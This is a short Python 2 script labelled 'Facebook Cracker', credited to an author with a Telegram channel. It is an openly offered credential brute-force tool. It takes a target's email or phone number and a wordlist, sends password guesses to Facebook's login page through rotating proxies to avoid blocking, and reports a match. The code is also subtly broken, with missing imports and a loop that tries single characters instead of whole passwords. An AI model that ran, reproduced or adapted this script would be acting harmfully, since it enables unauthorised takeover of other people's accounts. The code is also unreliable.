import requests,os,sys,socket,socks
wel2 = """
    +----------------------------------------------+
    | Name:        Facebook Cracker
    | Author:      ABONASR
    | Telegram Channel : https://t.me/B4_4444
    +----------------------------------------------+
    """
#Install Requests
os.system("pip2 install requests")
#Clear Everything
if sys.platform.startswith('win32'):
    os.system("cls")
if sys.platform.startswith('linux'):
   os.system("clear")
if sys.platform.startswith('linux2'):
    os.system("clear")
if sys.platform.startswith('unix'):
    os.system("clear")
cookies = cookielib.CookieJar()
cookies.clear()
cookies.clear_session_cookies()
url = "https://www.facebook.com/login.php?login_attempt=1&authlevel=1&seclevel=1&sec_level=1&auth_level=1"
for i in wel2:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.02)
user = (raw_input("Enter the Facebook Email (or) Phone Number :"))
word = (raw_input("Enter the wordlist and path : "))
proxylist = (raw_input("Enter the http Proxies and path : "))
proxytype = (raw_input('''Give me the HTTP proxylist:'''))
print("\033[0;31m"+"Warning:All proxies must be valid so check them first")
w = open(word,"r").read()
proxiestouse = open(proxylist,"r").read().splitlines()
for i in w:
    for proxy in proxiestouse:
        if ':' in proxy and len(proxy.split(':')) == 2:
            proxyIP = proxy.split(':')[0]
            proxyPORT = proxy.split(':')[1]
            ##Setup Proxy#
            HTTP_PROXY_HOST = str(proxyIP)
            HTTP_PROXY_PORT = int(proxyPORT)

            def create_connection(address, timeout=None, source_address=None):
                sock = socks.socksocket()
                sock.connect(address)
                return sock

            # add username and password arguments if proxy authentication required.
            socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, HTTP_PROXY_HOST, HTTP_PROXY_PORT)

            # patch the socket module
            socket.socket = socks.socksocket
            socket.create_connection = create_connection
            pay = {'email':user , 'pass': i}
            r = requests.post(url,data=pay)
            sys.stdout.write("\n\r[*] Trying .....{}\n".format(i))
            sys.stdout.flush()
            checkcracked = re.findall('href="/messages/t/"', r.text)
            if checkcracked:
                print("\n\n[+] Password Find = {}".format(i))
                raw_input("Press anything to exit")
                sys.exit(1)
